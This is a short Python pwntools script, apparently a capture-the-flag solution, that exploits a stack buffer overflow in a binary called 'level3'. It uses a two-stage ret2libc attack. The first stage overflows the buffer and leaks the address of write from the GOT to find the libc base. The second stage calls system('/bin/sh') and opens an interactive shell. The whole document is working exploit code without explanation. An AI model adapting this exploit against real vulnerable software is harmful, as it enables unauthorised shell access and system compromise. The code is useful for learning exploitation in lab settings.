from pwn import *
sh = process("./level3")
elf = ELF("./level3")
libc = ELF("./libc.so.6")

write_plt = elf.plt["write"]
write_got = elf.got["write"]
vul = elf.symbols["vulnerable_function"]

payload1 = flat(b'b'*0x8c, write_plt, vul, 1, write_got, 4)
# sh.recvuntil(b"Input:\n")
sh.sendline(payload1)
sh.recvuntil(":\n")
write_addr = u32(sh.recv(4))

baseaddr = write_addr - libc.symbols["write"]
systemaddr = baseaddr + libc.symbols["system"]
binsh = baseaddr + next(libc.search(b"/bin/sh"))

payload2 = flat(b'b'*0x8c, systemaddr, b'b'*4, binsh)
sh.sendline(payload2)
sh.interactive()